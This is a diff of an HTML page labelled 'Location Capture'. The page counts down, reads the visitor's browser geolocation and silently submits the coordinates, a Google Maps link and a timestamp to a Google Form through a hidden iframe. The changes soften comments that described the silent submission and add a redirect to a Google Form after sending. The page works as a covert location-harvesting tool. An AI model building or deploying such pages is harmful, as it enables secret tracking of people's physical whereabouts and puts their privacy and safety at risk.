@@ -38,11 +38,12 @@
 <div class="box">
   <h3>Location Capture</h3>
   <p>Submitting automatically...</p>
+
   <div id="timer">5</div>
   <p id="status">Starting...</p>
 </div>
 
-<!-- Hidden iframe for silent submission -->
+<!-- Hidden iframe (prevents redirect during submit) -->
 <iframe name="hidden_iframe" style="display:none;"></iframe>
 
 <script>
@@ -51,7 +52,7 @@ let count = 5;
 const timer = document.getElementById("timer");
 const status = document.getElementById("status");
 
-// Countdown
+// Countdown timer
 let interval = setInterval(() => {
   count--;
   timer.innerHTML = count;
@@ -77,10 +78,10 @@ function getLocation() {
     const lon = pos.coords.longitude;
     const time = new Date().toLocaleString();
 
-    // ✅ Google Maps clickable link
+    // Google Maps link
     const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
 
-    // ✅ Final value sent to Google Form
+    // Final formatted value
     const value =
       "Latitude: " + lat +
       " | Longitude: " + lon +
@@ -104,7 +105,13 @@ function getLocation() {
 
     form.submit();
 
-    status.innerHTML = "✅ Location submitted successfully";
+    status.innerHTML = "✅ Submitted successfully";
+
+    // Redirect after submission
+    setTimeout(() => {
+      window.location.href =
+        "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/viewform";
+    }, 1500);
 
   }, function(err) {
     status.innerHTML = "❌ Error: " + err.message;
